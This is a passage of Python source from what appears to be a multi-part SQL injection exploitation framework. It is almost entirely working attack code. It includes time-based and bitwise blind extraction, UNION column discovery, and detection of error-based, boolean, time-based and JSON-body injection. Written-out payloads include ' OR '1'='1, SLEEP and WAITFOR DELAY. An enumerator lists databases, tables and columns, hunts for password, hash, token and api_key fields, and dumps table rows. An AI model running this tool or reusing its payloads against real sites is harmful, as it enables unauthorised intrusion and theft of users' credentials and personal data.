        payload = self._build_delay_payload(condition)
        if not payload:
            return False
        
        test_params = self.params_dict.copy()
        test_params[self.param] = [self.params_dict[self.param][0] + payload]
        test_url = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{urlencode(test_params, doseq=True)}"
        
        delays = []
        for _ in range(samples):
            start = time.time()
            self.http.get(test_url)
            elapsed = time.time() - start
            delays.append(elapsed)
        
        avg_delay = statistics.mean(delays)
        baseline = self._get_baseline()
        
        return (avg_delay - baseline) >= (self.delay - 1)
    
    def extract_string_binary(self, query: str, max_length: int = 100) -> str:
        """Extract string using binary search with time delays"""
        substring_func = self.config.get('substring', 'SUBSTRING')
        ascii_func = self.config.get('ascii', 'ASCII')
        
        result = ""
        
        for pos in range(1, max_length + 1):
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                
                if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
                    char_expr = f"{ascii_func}({substring_func}(({query}),{pos},1))"
                elif self.dbms == DBMS.POSTGRESQL:
                    char_expr = f"{ascii_func}({substring_func}(({query}),{pos},1))"
                elif self.dbms == DBMS.MSSQL:
                    char_expr = f"{ascii_func}({substring_func}(({query}),{pos},1))"
                elif self.dbms == DBMS.ORACLE:
                    char_expr = f"{ascii_func}(SUBSTR(({query}),{pos},1))"
                else:
                    char_expr = f"ASCII(SUBSTRING(({query}),{pos},1))"
                
                condition = f"{char_expr}>{mid}"
                
                if self._test_condition(condition):
                    low = mid + 1
                else:
                    high = mid - 1
            
            if low < 32 or low > 126:
                break
            
            result += chr(low)
            logger.info(f"[Time-based] Extracted: {result}")
        
        return result
    
    def extract_string_bitwise(self, query: str, max_length: int = 100) -> str:
        """Extract string using bitwise operations (faster for some DBMS)"""
        substring_func = self.config.get('substring', 'SUBSTRING')
        ascii_func = self.config.get('ascii', 'ASCII')
        
        result = ""
        
        for pos in range(1, max_length + 1):
            char_value = 0
            
            for bit in range(7, -1, -1):
                test_val = char_value | (1 << bit)
                
                if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
                    char_expr = f"{ascii_func}({substring_func}(({query}),{pos},1))"
                    condition = f"({char_expr}&{test_val})={test_val}"
                else:
                    char_expr = f"{ascii_func}({substring_func}(({query}),{pos},1))"
                    condition = f"({char_expr}&{test_val})={test_val}"
                
                if self._test_condition(condition, samples=2):
                    char_value = test_val
            
            if char_value < 32 or char_value > 126:
                break
            
            result += chr(char_value)
            logger.info(f"[Time-based bitwise] Extracted: {result}")
        
        return result


class UnionExtractionEngine:
    """UNION-based SQL injection exploitation"""
    
    def __init__(self, http_engine, url: str, param: str, dbms: DBMS = DBMS.UNKNOWN):
        self.http = http_engine
        self.url = url
        self.param = param
        self.dbms = dbms
        self.parsed = urlparse(url)
        self.params_dict = parse_qs(self.parsed.query)
        self.config = DBMSFingerprinter.get_config(dbms) if dbms != DBMS.UNKNOWN else {}
        
        self.num_columns = None
        self.injectable_columns = []
        self.null_replacement = 'NULL'
    
    def find_column_count_binary(self) -> Optional[int]:
        """Find number of columns using binary search"""
        low, high = 1, 100
        
        while low <= high:
            mid = (low + high) // 2
            
            nulls = ','.join([self.null_replacement] * mid)
            payload = f"' UNION SELECT {nulls}--"
            
            test_params = self.params_dict.copy()
            test_params[self.param] = [self.params_dict[self.param][0] + payload]
            test_url = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{urlencode(test_params, doseq=True)}"
            
            resp = self.http.get(test_url)
            if not resp:
                continue
            
            error_indicators = [
                'number of columns', 'operands', 'column count', 'mismatch',
                'The used SELECT statements have a different number of columns',
                'SELECTs to the left and right of UNION do not have the same number of result columns',
                'All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions'
            ]
            
            has_error = any(ind.lower() in resp.text.lower() for ind in error_indicators)
            
            if not has_error and resp.status_code == 200:
                if self._verify_column_count(mid):
                    self.num_columns = mid
                    return mid
                high = mid - 1
            else:
                high = mid - 1
        
        return None
    
    def _verify_column_count(self, num_cols: int) -> bool:
        """Verify column count with marker"""
        marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:12]
        
        columns = [self.null_replacement] * num_cols
        columns[0] = f"'{marker}'"
        
        payload = f"' UNION SELECT {','.join(columns)}--"
        
        test_params = self.params_dict.copy()
        test_params[self.param] = [self.params_dict[self.param][0] + payload]
        test_url = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{urlencode(test_params, doseq=True)}"
        
        resp = self.http.get(test_url)
        
        return resp and marker in resp.text
    
    def find_injectable_columns(self) -> List[int]:
        """Find which columns are injectable (reflected in response)"""
        if not self.num_columns:
            return []
        
        injectable = []
        
        for col_idx in range(self.num_columns):
            marker = f"EREBUS_{hashlib.md5(str(time.time() + col_idx).encode()).hexdigest()[:8]}"
            
            columns = [self.null_replacement] * self.num_columns
            columns[col_idx] = f"'{marker}'"
            
            payload = f"' UNION SELECT {','.join(columns)}--"
            
            test_params = self.params_dict.copy()
            test_params[self.param] = [self.params_dict[self.param][0] + payload]
            test_url = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{urlencode(test_params, doseq=True)}"
            
            resp = self.http.get(test_url)
            if resp and marker in resp.text:
                injectable.append(col_idx)
                logger.info(f"Found injectable column: {col_idx}")
        
        self.injectable_columns = injectable
        return injectable
    
    def extract_data(self, query: str, column_index: Optional[int] = None) -> Optional[str]:
        """Extract data using UNION injection"""
        if not self.injectable_columns:
            self.find_injectable_columns()
        
        if not self.injectable_columns:
            return None
        
        if column_index is None:
            column_index = self.injectable_columns[0]
        elif column_index not in self.injectable_columns:
            return None
        
        columns = [self.null_replacement] * self.num_columns
        columns[column_index] = f"({query})"
        
        payload = f"' UNION SELECT {','.join(columns)}--"
        
        test_params = self.params_dict.copy()
        test_params[self.param] = [self.params_dict[self.param][0] + payload]
        test_url = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{urlencode(test_params, doseq=True)}"
        
        resp = self.http.get(test_url)
        if not resp:
            return None
        
        return resp.text
    
    def dump_table(self, table_name: str, database: Optional[str] = None, limit: int = 100) -> List[Dict]:
        """Dump table contents"""
        if not self.injectable_columns:
            return []
        
        results = []
        
        if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
            if database:
                query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema='{database}'"
            else:
                query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
        elif self.dbms == DBMS.POSTGRESQL:
            query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
        elif self.dbms == DBMS.MSSQL:
            if database:
                query = f"SELECT name FROM {database}.sys.columns WHERE object_id=OBJECT_ID('{table_name}')"
            else:
                query = f"SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table_name}')"
        else:
            return []
        
        columns_data = self.extract_data(query)
        if not columns_data:
            return []
        
        return results
    
"""
Advanced SQL Injection Module - Part 3/3
Main SQLi scanner class with complete exploitation capabilities
"""


class DatabaseEnumerator:
    """Complete database enumeration engine"""
    
    def __init__(self, extraction_engine, dbms: DBMS):
        self.engine = extraction_engine
        self.dbms = dbms
        self.config = DBMSFingerprinter.get_config(dbms)
    
    def enumerate_databases(self) -> List[str]:
        """Enumerate all databases"""
        logger.info("Enumerating databases...")
        
        if isinstance(self.engine, UnionExtractionEngine):
            return self._enum_databases_union()
        elif isinstance(self.engine, TimeInferenceEngine):
            return self._enum_databases_time()
        elif isinstance(self.engine, BooleanInferenceEngine):
            return self._enum_databases_boolean()
        
        return []
    
    def _enum_databases_union(self) -> List[str]:
        """Enumerate databases via UNION"""
        query = self.config.get('database_enum', '')
        if not query:
            return []
        
        data = self.engine.extract_data(query)
        if not data:
            return []
        
        databases = re.findall(r'[\w_]+', data)
        return list(set(databases))
    
    def _enum_databases_time(self) -> List[str]:
        """Enumerate databases via time-based (limited)"""
        current_db = self.get_current_database()
        return [current_db] if current_db else []
    
    def _enum_databases_boolean(self) -> List[str]:
        """Enumerate databases via boolean-based (limited)"""
        current_db = self.get_current_database()
        return [current_db] if current_db else []
    
    def enumerate_tables(self, database: str) -> List[str]:
        """Enumerate tables in database"""
        logger.info(f"Enumerating tables in database: {database}")
        
        if isinstance(self.engine, UnionExtractionEngine):
            return self._enum_tables_union(database)
        elif isinstance(self.engine, TimeInferenceEngine):
            return self._enum_tables_time(database)
        elif isinstance(self.engine, BooleanInferenceEngine):
            return self._enum_tables_boolean(database)
        
        return []
    
    def _enum_tables_union(self, database: str) -> List[str]:
        """Enumerate tables via UNION"""
        query_template = self.config.get('table_enum', '')
        if not query_template:
            return []
        
        query = query_template.format(database)
        data = self.engine.extract_data(query)
        
        if not data:
            return []
        
        tables = re.findall(r'[\w_]+', data)
        return list(set(tables))
    
    def _enum_tables_time(self, database: str) -> List[str]:
        """Enumerate tables via time-based (slow, limited)"""
        common_tables = [
            'users', 'user', 'admin', 'administrators', 'accounts', 'members',
            'customers', 'clients', 'login', 'logins', 'auth', 'authentication',
            'employee', 'employees', 'staff', 'products', 'items', 'orders'
        ]
        
        found_tables = []
        
        for table in common_tables:
            if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
                query = f"SELECT 1 FROM information_schema.tables WHERE table_name='{table}' AND table_schema='{database}'"
            elif self.dbms == DBMS.POSTGRESQL:
                query = f"SELECT 1 FROM pg_tables WHERE tablename='{table}'"
            elif self.dbms == DBMS.MSSQL:
                query = f"SELECT 1 FROM {database}.sys.tables WHERE name='{table}'"
            else:
                continue
            
            if self.engine._test_condition(f"EXISTS({query})"):
                found_tables.append(table)
                logger.info(f"Found table: {table}")
        
        return found_tables
    
    def _enum_tables_boolean(self, database: str) -> List[str]:
        """Enumerate tables via boolean-based (slow, limited)"""
        return self._enum_tables_time(database)
    
    def enumerate_columns(self, table: str, database: Optional[str] = None) -> List[str]:
        """Enumerate columns in table"""
        logger.info(f"Enumerating columns in table: {table}")
        
        if isinstance(self.engine, UnionExtractionEngine):
            return self._enum_columns_union(table, database)
        elif isinstance(self.engine, TimeInferenceEngine):
            return self._enum_columns_time(table, database)
        elif isinstance(self.engine, BooleanInferenceEngine):
            return self._enum_columns_boolean(table, database)
        
        return []
    
    def _enum_columns_union(self, table: str, database: Optional[str] = None) -> List[str]:
        """Enumerate columns via UNION"""
        query_template = self.config.get('column_enum', '')
        if not query_template:
            return []
        
        if database:
            query = query_template.format(table, database)
        else:
            query = query_template.format(table)
        
        data = self.engine.extract_data(query)
        
        if not data:
            return []
        
        columns = re.findall(r'[\w_]+', data)
        return list(set(columns))
    
    def _enum_columns_time(self, table: str, database: Optional[str] = None) -> List[str]:
        """Enumerate columns via time-based"""
        common_columns = [
            'id', 'user_id', 'username', 'user_name', 'login', 'email', 'mail',
            'password', 'passwd', 'pass', 'pwd', 'hash', 'token', 'api_key',
            'first_name', 'last_name', 'name', 'fullname', 'phone', 'address',
            'role', 'privileges', 'is_admin', 'admin', 'active', 'status'
        ]
        
        found_columns = []
        
        for column in common_columns:
            if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
                if database:
                    query = f"SELECT 1 FROM information_schema.columns WHERE column_name='{column}' AND table_name='{table}' AND table_schema='{database}'"
                else:
                    query = f"SELECT 1 FROM information_schema.columns WHERE column_name='{column}' AND table_name='{table}'"
            elif self.dbms == DBMS.POSTGRESQL:
                query = f"SELECT 1 FROM information_schema.columns WHERE column_name='{column}' AND table_name='{table}'"
            elif self.dbms == DBMS.MSSQL:
                if database:
                    query = f"SELECT 1 FROM {database}.sys.columns WHERE name='{column}' AND object_id=OBJECT_ID('{table}')"
                else:
                    query = f"SELECT 1 FROM sys.columns WHERE name='{column}' AND object_id=OBJECT_ID('{table}')"
            else:
                continue
            
            if self.engine._test_condition(f"EXISTS({query})"):
                found_columns.append(column)
                logger.info(f"Found column: {column}")
        
        return found_columns
    
    def _enum_columns_boolean(self, table: str, database: Optional[str] = None) -> List[str]:
        """Enumerate columns via boolean-based"""
        return self._enum_columns_time(table, database)
    
    def get_current_database(self) -> Optional[str]:
        """Get current database name"""
        current_db_query = self.config.get('current_db', '')
        if not current_db_query:
            return None
        
        if isinstance(self.engine, UnionExtractionEngine):
            data = self.engine.extract_data(current_db_query)
            if data:
                match = re.search(r'[\w_]+', data)
                return match.group(0) if match else None
        
        elif isinstance(self.engine, TimeInferenceEngine):
            return self.engine.extract_string_binary(current_db_query, max_length=64)
        
        elif isinstance(self.engine, BooleanInferenceEngine):
            return self.engine.extract_string_binary(current_db_query, max_length=64)
        
        return None
    
    def get_current_user(self) -> Optional[str]:
        """Get current database user"""
        current_user_query = self.config.get('current_user', '')
        if not current_user_query:
            return None
        
        if isinstance(self.engine, UnionExtractionEngine):
            data = self.engine.extract_data(current_user_query)
            if data:
                match = re.search(r'[\w@._-]+', data)
                return match.group(0) if match else None
        
        elif isinstance(self.engine, TimeInferenceEngine):
            return self.engine.extract_string_binary(current_user_query, max_length=64)
        
        elif isinstance(self.engine, BooleanInferenceEngine):
            return self.engine.extract_string_binary(current_user_query, max_length=64)
        
        return None
    
    def get_version(self) -> Optional[str]:
        """Get database version"""
        version_query = self.config.get('version', '')
        if not version_query:
            return None
        
        if isinstance(self.engine, UnionExtractionEngine):
            data = self.engine.extract_data(version_query)
            if data:
                match = re.search(r'[\d\.\w\s-]+', data)
                return match.group(0) if match else None
        
        elif isinstance(self.engine, TimeInferenceEngine):
            return self.engine.extract_string_binary(version_query, max_length=100)
        
        elif isinstance(self.engine, BooleanInferenceEngine):
            return self.engine.extract_string_binary(version_query, max_length=100)
        
        return None
    
    def dump_data(self, table: str, columns: List[str], database: Optional[str] = None, limit: int = 100) -> List[Dict]:
        """Dump data from table"""
        logger.info(f"Dumping data from {table} ({', '.join(columns)})")
        
        if not columns:
            return []
        
        concat_func = self.config.get('concat', 'CONCAT')
        
        if isinstance(self.engine, UnionExtractionEngine):
            return self._dump_data_union(table, columns, database, limit)
        elif isinstance(self.engine, TimeInferenceEngine):
            return self._dump_data_time(table, columns, database, limit)
        elif isinstance(self.engine, BooleanInferenceEngine):
            return self._dump_data_boolean(table, columns, database, limit)
        
        return []
    
    def _dump_data_union(self, table: str, columns: List[str], database: Optional[str], limit: int) -> List[Dict]:
        """Dump data via UNION"""
        results = []
        
        if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
            columns_concat = f"CONCAT({',0x3a,'.join(columns)})"
            if database:
                query = f"SELECT GROUP_CONCAT({columns_concat} SEPARATOR 0x7c) FROM {database}.{table} LIMIT {limit}"
            else:
                query = f"SELECT GROUP_CONCAT({columns_concat} SEPARATOR 0x7c) FROM {table} LIMIT {limit}"
        
        elif self.dbms == DBMS.POSTGRESQL:
            columns_concat = f"{'||' + ':|' + '||'.join(columns)}"
            query = f"SELECT string_agg({columns_concat}, '|') FROM {table} LIMIT {limit}"
        
        elif self.dbms == DBMS.MSSQL:
            columns_concat = f"{'+' + ':' + '+'.join(columns)}"
            if database:
                query = f"SELECT TOP {limit} {columns_concat} FROM {database}..{table}"
            else:
                query = f"SELECT TOP {limit} {columns_concat} FROM {table}"
        
        else:
            return []
        
        data = self.engine.extract_data(query)
        if not data:
            return []
        
        rows = data.split('|')
        for row in rows:
            values = row.split(':')
            if len(values) == len(columns):
                row_dict = dict(zip(columns, values))
                results.append(row_dict)
        
        return results
    
    def _dump_data_time(self, table: str, columns: List[str], database: Optional[str], limit: int) -> List[Dict]:
        """Dump data via time-based (very slow)"""
        results = []
        
        for row_num in range(min(limit, 10)):
            row_data = {}
            
            for column in columns:
                if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
                    if database:
                        query = f"SELECT {column} FROM {database}.{table} LIMIT {row_num},1"
                    else:
                        query = f"SELECT {column} FROM {table} LIMIT {row_num},1"
                
                elif self.dbms == DBMS.POSTGRESQL:
                    query = f"SELECT {column} FROM {table} OFFSET {row_num} LIMIT 1"
                
                elif self.dbms == DBMS.MSSQL:
                    if database:
                        query = f"SELECT {column} FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS rn, * FROM {database}..{table}) t WHERE rn={row_num+1}"
                    else:
                        query = f"SELECT {column} FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS rn, * FROM {table}) t WHERE rn={row_num+1}"
                
                else:
                    continue
                
                value = self.engine.extract_string_binary(query, max_length=200)
                row_data[column] = value
                logger.info(f"Row {row_num}, {column}: {value}")
            
            if row_data:
                results.append(row_data)
        
        return results
    
    def _dump_data_boolean(self, table: str, columns: List[str], database: Optional[str], limit: int) -> List[Dict]:
        """Dump data via boolean-based (very slow)"""
        return self._dump_data_time(table, columns, database, limit)


class SQLiModule:
    """
    Professional SQL Injection Module
    Complete exploitation framework with all techniques
    """
    
    def __init__(self, http_engine, evasion_engine=None):
        self.http = http_engine
        self.evasion = evasion_engine
        self.dbms = DBMS.UNKNOWN
        self.payload_gen = PayloadGenerator()
        self.mutator = PayloadMutator()
        
    def scan(self, url: str, fast_mode: bool = False, deep_mode: bool = True,
             enable_mutations: bool = True, method: str = "GET",
             data: Optional[Dict] = None) -> List[SQLiVulnerability]:
        vulnerabilities: List[SQLiVulnerability] = []

        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        # Collect all parameter sources
        all_params: Dict[str, List[str]] = {}
        all_params.update(query_params)

        # POST form params
        if method.upper() == "POST" and data:
            for k, v in data.items():
                all_params[k] = [str(v)] if not isinstance(v, list) else v

        if not all_params:
            logger.warning(f"No parameters found in URL: {url}")
            # Attempt JSON body scan if endpoint looks like an API
            if parsed.path.startswith(("/api", "/rest", "/graphql")):
                vulnerabilities.extend(self._scan_json_body(url))
            return vulnerabilities

        if fast_mode:
            test_functions = [self._test_error_based_fast, self._test_time_based_fast]
        else:
            test_functions = [
                self._test_error_based,
                self._test_union_based,
                self._test_boolean_blind,
                self._test_time_based,
            ]
            if deep_mode:
                test_functions.append(self._test_stacked_queries)

        # Build a URL that has all params for each test (merge POST into query for GET-based tests)
        if method.upper() == "POST" and data and not query_params:
            merged_qs = urlencode({k: v[0] for k, v in all_params.items()})
            test_base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{merged_qs}"
        else:
            test_base_url = url

        with ThreadPoolExecutor(max_workers=min(len(all_params), 10)) as executor:
            futures = []
            for param in all_params:
                for test_func in test_functions:
                    if test_func is self._test_error_based:
                        fut = executor.submit(test_func, test_base_url, param, enable_mutations)
                    else:
                        fut = executor.submit(test_func, test_base_url, param)
                    futures.append((param, test_func.__name__, fut))

            for param, test_name, future in futures:
                try:
                    result = future.result(timeout=300)
                    if result:
                        result.url = url
                        result.parameter = param
                        vulnerabilities.append(result)
                        logger.info(f"SQLi found param={param!r} dbms={result.dbms.value}")
                except Exception as e:
                    logger.debug(f"{test_name}({param}): {e}")

        return vulnerabilities

    def _scan_json_body(self, url: str) -> List[SQLiVulnerability]:
        """Test common JSON body fields against API endpoints."""
        results: List[SQLiVulnerability] = []
        common_fields = ["q", "search", "query", "id", "username", "email", "name", "filter"]
        probes = ["'", '"', "' OR '1'='1", "1 AND 1=2--"]

        baseline_resp = self.http.get(url)
        baseline_has_error = bool(_GENERIC_SQL_ERROR_RE.search(baseline_resp.text)) if baseline_resp else False

        for field in common_fields:
            for probe in probes:
                try:
                    body = json.dumps({field: probe})
                    resp = self.http.post(url, data=body,
                                         headers={"Content-Type": "application/json"})
                    if not resp:
                        continue
                    has_error = bool(_GENERIC_SQL_ERROR_RE.search(resp.text))
                    detected_dbms = DBMSFingerprinter.identify(resp.text, resp.headers)
                    if has_error and not baseline_has_error or detected_dbms != DBMS.UNKNOWN:
                        if detected_dbms == DBMS.UNKNOWN:
                            detected_dbms = self._infer_dbms_from_text(resp.text) or DBMS.UNKNOWN
                        results.append(SQLiVulnerability(
                            url=url, parameter=f"json:{field}",
                            technique=InjectionTechnique.ERROR_BASED,
                            dbms=detected_dbms, payload=probe,
                            confidence=0.88, exploitable=True,
                            metadata={"method": "JSON POST", "response_excerpt": resp.text[:300]},
                        ))
                        return results
                except Exception:
                    pass
        return results
    
    def _test_error_based(self, url: str, param: str, enable_mutations: bool = True) -> Optional[SQLiVulnerability]:
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original_value = params_dict[param][0]

        baseline_resp = self.http.get(url)
        baseline_dbms = DBMS.UNKNOWN
        baseline_has_error = False
        if baseline_resp:
            baseline_dbms = DBMSFingerprinter.identify(baseline_resp.text, baseline_resp.headers)
            baseline_has_error = bool(_GENERIC_SQL_ERROR_RE.search(baseline_resp.text))

        payloads = self.payload_gen.error_based(max_payloads=1000, enable_mutations=enable_mutations)

        batch_size = 100
        for i in range(0, len(payloads), batch_size):
            batch = payloads[i:i+batch_size]
            test_urls = []
            for payload in batch:
                tp = params_dict.copy()
                tp[param] = [original_value + payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(tp, doseq=True)}"
                test_urls.append((test_url, payload))

            responses = self.http.parallel_get([u[0] for u in test_urls])

            for (test_url, payload), resp in zip(test_urls, responses.values()):
                if not resp:
                    continue
                detected_dbms = DBMSFingerprinter.identify(resp.text, resp.headers)
                has_generic_error = bool(_GENERIC_SQL_ERROR_RE.search(resp.text))

                dbms_triggered = (detected_dbms != DBMS.UNKNOWN and detected_dbms != baseline_dbms)
                generic_triggered = has_generic_error and not baseline_has_error

                if dbms_triggered or generic_triggered:
                    if detected_dbms == DBMS.UNKNOWN:
                        detected_dbms = self._infer_dbms_from_text(resp.text) or DBMS.UNKNOWN
                    self.dbms = detected_dbms
                    if detected_dbms != DBMS.UNKNOWN:
                        self.payload_gen = PayloadGenerator(detected_dbms, self.mutator)
                    return SQLiVulnerability(
                        url=url,
                        parameter=param,
                        technique=InjectionTechnique.ERROR_BASED,
                        dbms=detected_dbms,
                        payload=payload,
                        confidence=0.98 if dbms_triggered else 0.90,
                        exploitable=True,
                        metadata={"response_excerpt": resp.text[:500], "status_code": resp.status_code},
                    )

        return None

    def _test_error_based_fast(self, url: str, param: str) -> Optional[SQLiVulnerability]:
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original_value = params_dict[param][0]

        baseline_resp = self.http.get(url)
        baseline_has_error = bool(_GENERIC_SQL_ERROR_RE.search(baseline_resp.text)) if baseline_resp else False

        fast_payloads = [
            "'", '"', "' OR '1'='1", '1" OR "1"="1',
            "1' AND '1'='1", "' AND 1=CONVERT(int,@@version)--",
            "1 AND 1=2--", "' OR 1=1--", "`", "\\",
        ]

        for payload in fast_payloads:
            tp = params_dict.copy()
            tp[param] = [original_value + payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(tp, doseq=True)}"
            resp = self.http.get(test_url)
            if not resp:
                continue
            detected_dbms = DBMSFingerprinter.identify(resp.text, resp.headers)
            has_generic_error = bool(_GENERIC_SQL_ERROR_RE.search(resp.text))

            if detected_dbms != DBMS.UNKNOWN or (has_generic_error and not baseline_has_error):
                if detected_dbms == DBMS.UNKNOWN:
                    detected_dbms = self._infer_dbms_from_text(resp.text) or DBMS.UNKNOWN
                self.dbms = detected_dbms
                return SQLiVulnerability(
                    url=url,
                    parameter=param,
                    technique=InjectionTechnique.ERROR_BASED,
                    dbms=detected_dbms,
                    payload=payload,
                    confidence=0.95 if detected_dbms != DBMS.UNKNOWN else 0.85,
                    exploitable=True,
                )

        return None

    @staticmethod
    def _infer_dbms_from_text(text: str) -> Optional["DBMS"]:
        t = text.lower()
        if "sqlite" in t or "sequelize" in t:
            return DBMS.SQLITE
        if "mysql" in t or "mariadb" in t:
            return DBMS.MYSQL
        if "postgresql" in t or "psql" in t or "pg::" in t:
            return DBMS.POSTGRESQL
        if "microsoft sql" in t or "mssql" in t or "sql server" in t:
            return DBMS.MSSQL
        if "ora-" in t or "oracle" in t:
            return DBMS.ORACLE
        return None
    
    def _test_boolean_blind(self, url: str, param: str) -> Optional[SQLiVulnerability]:
        """Test for boolean-based blind SQL injection"""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original_value = params_dict[param][0]
        
        baseline_lengths = []
        for _ in range(5):
            resp = self.http.get(url)
            if resp:
                baseline_lengths.append(len(resp.text))
        
        if not baseline_lengths:
            return None
        
        baseline_avg = statistics.mean(baseline_lengths)
        baseline_stdev = statistics.stdev(baseline_lengths) if len(baseline_lengths) > 1 else 0
        
        payload_gen = PayloadGenerator(self.dbms, self.mutator) if self.dbms != DBMS.UNKNOWN else PayloadGenerator(mutator=self.mutator)
        boolean_pairs = payload_gen.boolean_blind(max_pairs=30)
        
        for true_payload, false_payload in boolean_pairs:
            true_lengths = []
            false_lengths = []
            
            for _ in range(5):
                test_params = params_dict.copy()
                test_params[param] = [original_value + true_payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                resp = self.http.get(test_url)
                if resp:
                    true_lengths.append(len(resp.text))
            
            for _ in range(5):
                test_params = params_dict.copy()
                test_params[param] = [original_value + false_payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                resp = self.http.get(test_url)
                if resp:
                    false_lengths.append(len(resp.text))
            
            if not true_lengths or not false_lengths:
                continue
            
            true_avg = statistics.mean(true_lengths)
            false_avg = statistics.mean(false_lengths)
            
            threshold = max(150, baseline_stdev * 4)
            
            if abs(true_avg - baseline_avg) < threshold and abs(false_avg - baseline_avg) > threshold * 2:
                return SQLiVulnerability(
                    url=url,
                    parameter=param,
                    technique=InjectionTechnique.BOOLEAN_BLIND,
                    dbms=self.dbms,
                    payload=(true_payload, false_payload),
                    confidence=0.92,
                    exploitable=True,
                    metadata={
                        'baseline_avg': baseline_avg,
                        'true_avg': true_avg,
                        'false_avg': false_avg,
                        'threshold': threshold
                    }
                )
        
        return None
    
    def _test_time_based(self, url: str, param: str) -> Optional[SQLiVulnerability]:
        """Test for time-based blind SQL injection"""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original_value = params_dict[param][0]
        
        baseline_times = []
        for _ in range(3):
            start = time.time()
            self.http.get(url)
            elapsed = time.time() - start
            baseline_times.append(elapsed)
        
        baseline_avg = statistics.mean(baseline_times)
        
        delay = 5
        payload_gen = PayloadGenerator(self.dbms, self.mutator) if self.dbms != DBMS.UNKNOWN else PayloadGenerator(mutator=self.mutator)
        time_payloads_dict = payload_gen.time_based(delay=delay, max_payloads=20)
        
        test_order = [DBMS.MYSQL, DBMS.POSTGRESQL, DBMS.MSSQL, DBMS.ORACLE, DBMS.SQLITE]
        
        for dbms in test_order:
            if dbms not in time_payloads_dict:
                continue
            
            payloads = time_payloads_dict[dbms]
            
            for payload in payloads:
                delay_times = []
                
                for _ in range(3):
                    test_params = params_dict.copy()
                    test_params[param] = [original_value + payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    start = time.time()
                    self.http.get(test_url)
                    elapsed = time.time() - start
                    delay_times.append(elapsed)
                
                delay_avg = statistics.mean(delay_times)
                delay_stdev = statistics.stdev(delay_times) if len(delay_times) > 1 else 0
                
                if delay_avg >= (delay - 1) and delay_stdev < 2.0 and (delay_avg - baseline_avg) > 3.5:
                    self.dbms = dbms
                    return SQLiVulnerability(
                        url=url,
                        parameter=param,
                        technique=InjectionTechnique.TIME_BLIND,
                        dbms=dbms,
                        payload=payload,
                        confidence=0.94,
                        exploitable=True,
                        metadata={
                            'baseline_avg': baseline_avg,
                            'delay_avg': delay_avg,
                            'delay_stdev': delay_stdev,
                            'expected_delay': delay
                        }
                    )
        
        return None
    
    def _test_time_based_fast(self, url: str, param: str) -> Optional[SQLiVulnerability]:
        """Fast time-based test with baseline comparison and multi-sample confirmation."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original_value = params_dict[param][0]

        baseline_times = []
        for _ in range(3):
            start = time.time()
            self.http.get(url)
            baseline_times.append(time.time() - start)
        baseline_avg = statistics.mean(baseline_times)

        delay = 5
        fast_payloads = [
            (DBMS.MYSQL,      f"' AND SLEEP({delay})--"),
            (DBMS.POSTGRESQL, f"'; SELECT pg_sleep({delay})--"),
            (DBMS.MSSQL,      f"'; WAITFOR DELAY '0:0:{delay}'--"),
        ]

        for dbms, payload in fast_payloads:
            test_params = params_dict.copy()
            test_params[param] = [original_value + payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

            sample_times = []
            for _ in range(3):
                start = time.time()
                self.http.get(test_url)
                sample_times.append(time.time() - start)

            avg_elapsed = statistics.mean(sample_times)

            if avg_elapsed >= (delay - 1) and (avg_elapsed - baseline_avg) >= 3.0:
                self.dbms = dbms
                return SQLiVulnerability(
                    url=url,
                    parameter=param,
                    technique=InjectionTechnique.TIME_BLIND,
                    dbms=dbms,
                    payload=payload,
                    confidence=0.90,
                    exploitable=True,
                    metadata={'baseline_avg': baseline_avg, 'delay_avg': avg_elapsed}
                )

        return None
    
    def _test_union_based(self, url: str, param: str) -> Optional[SQLiVulnerability]:
        """Test for UNION-based SQL injection"""
        engine = UnionExtractionEngine(self.http, url, param, self.dbms)
        
        num_cols = engine.find_column_count_binary()
        if not num_cols:
            return None
        
        injectable_cols = engine.find_injectable_columns()
        if not injectable_cols:
            return None
        
        columns = ['NULL'] * num_cols
        columns[injectable_cols[0]] = "'UNION_VERIFIED'"
        payload = f"' UNION SELECT {','.join(columns)}--"
        
        return SQLiVulnerability(
            url=url,
            parameter=param,
            technique=InjectionTechnique.UNION_BASED,
            dbms=self.dbms,
            payload=payload,
            confidence=0.99,
            exploitable=True,
            metadata={
                'num_columns': num_cols,
                'injectable_columns': injectable_cols
            }
        )
    
